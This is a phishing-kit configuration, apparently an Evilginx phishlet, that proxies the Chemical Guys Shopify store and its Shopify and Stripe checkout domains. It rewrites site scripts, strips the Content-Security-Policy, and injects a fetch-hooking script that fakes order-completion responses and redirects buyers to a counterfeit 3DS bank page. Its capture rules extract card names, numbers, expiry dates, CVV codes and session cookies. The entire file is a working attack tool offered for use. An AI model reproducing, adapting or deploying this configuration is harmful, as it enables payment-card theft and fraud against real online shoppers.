min_ver: '3.0.0'
proxy_hosts:
  # 主域名
  - {phish_sub: 'www', orig_sub: 'www', domain: 'chemicalguys.com', session: true, is_landing: true, auto_filter: true }
  - {phish_sub: '', orig_sub: '', domain: 'chemicalguys.com', session: true, is_landing: false, auto_filter: true }
  - {phish_sub: 'account', orig_sub: 'account', domain: 'chemicalguys.com', session: true, is_landing: false, auto_filter: true }

  # shopify 平台相关
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'sp', orig_sub: '', domain: 'shop.app', session: true, is_landing: false, auto_filter: true }
  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true }
  - {phish_sub: 'checkout.pci', orig_sub: 'checkout.pci', domain: 'shopifyinc.com', session: true, is_landing: false, auto_filter: true }
  - {phish_sub: 'pay', orig_sub: 'pay', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true }
  - {phish_sub: 'hooks', orig_sub: 'hooks', domain: 'stripe.com', session: true, is_landing: false, auto_filter: true }
  - {phish_sub: 'api', orig_sub: 'api', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }

sub_filters:
  #  hack提交按钮 （解决不能重复提交问题）
  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\.behavior===["'']block["'']\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\=\>["'']block["'']\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '\.behavior===["'']block["'']\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '\=\>["'']block["'']\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: 'Content-Security-Policy', replace: 'CSP', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}

js_inject:
  - trigger_domains: ["www.chemicalguys.com"]
    trigger_paths: ["/checkouts/.*"]
    script: |
      if (typeof window !== 'undefined') {
        top.window.hack = true;
        const originalFetch = window.fetch;

        const mockRules = [
          {
            url: 'SubmitForCompletion',
            response: {"data":{"submitForCompletion":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970983534820","purchaseOrder":{},"pollDelay":500,"__typename":"ProcessingReceipt"},"__typename":"SubmitSuccess"}}},
            status: 200
          },
          {
            url: 'PollForReceipt',
            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.chemicalguys.fake.com/phishing/phishing","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
            status: 200
          }
        ];

        window.fetch = (...args) => {
          const [input, init] = args;
          const url = typeof input === 'string' ? input : input.url?input.url:input.href;
          console.log("请求url:",args, url)
          const rule = mockRules.find(r => url.includes(r.url));

          if(rule && top.window.hack){
            return new Promise((resolve, reject) => {
              console.log(`拦截请求: ${url}，返回 mock 数据`);
              // 立即给前端返回 mock（前端先用这个继续跑逻辑）
              resolve(
                new Response(JSON.stringify(rule.response), {
                  status: rule.status,
                  statusText: 'OK',
                  headers: { 'Content-Type': 'application/json' }
                })
              );
           });
          }
          if(url.indexOf('SubmitForCompletion')>-1){
            console.log('放行 SubmitForCompletion 请求，等待后端处理')
            //top.window.hack = true; // 重新设置为 true，继续拦截
          }

          // 没匹配的请求走原始 fetch
          return originalFetch(...args);
        };
      }

intercept:
  # 自定义3ds页面
  - {domain: 'www.chemicalguys.com', mime: 'redirect', body: 'bankpage.chemicalguys.fake.com:3000', path: '\/phishing\/*', http_status: 301}

auth_tokens:
  - domain: 'chemicalguys.com'
    keys: []
    type: 'cookie'
credentials:
  username:
    key: ''
    search: '{"credit_card".*?"name":"([^"]*)"'
    type: 'json'
  password:
    key: ''
    search: '{"credit_card".*?"number":"([^"]*)"'
    type: 'json'
  custom:
    - key: 'name'
      search: '{"credit_card".*?"name":"([^"]*)"'
      type: 'json'
    - key: 'number'
      search: '{"credit_card".*?"number":"([^"]*)"'
      type: 'json'
    - key: 'month'
      search: '{"credit_card".*?"month":(\d+)'
      type: 'json'
    - key: 'year'
      search: '{"credit_card".*?"year":(\d+)'
      type: 'json'
    - key: 'verification_value'
      search: '{"credit_card".*?"verification_value":"([^"]*)"'
      type: 'json'
    - key: 'userAgent'
      search: '"userAgent":"([^"]*)"'
      type: 'json'
login:
  domain: 'www.chemicalguys.com'
  path: '/'